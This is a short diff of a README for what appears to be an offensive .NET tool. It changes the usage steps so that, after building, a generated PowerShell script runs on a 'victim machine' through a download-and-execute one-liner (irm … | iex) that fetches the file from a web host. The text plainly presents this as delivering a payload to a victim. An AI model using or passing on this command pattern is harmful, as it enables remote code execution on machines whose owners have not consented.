@@ -19,7 +19,11 @@ dotnet publish
 ```
 
 And go to `bin/Release` folder.\
-Send `.ps1` file to victim.
+
+Execute on victim machine powershell
+```
+irm http://localhost/FILE.ps1 | iex
+```
 
 ## Author
 
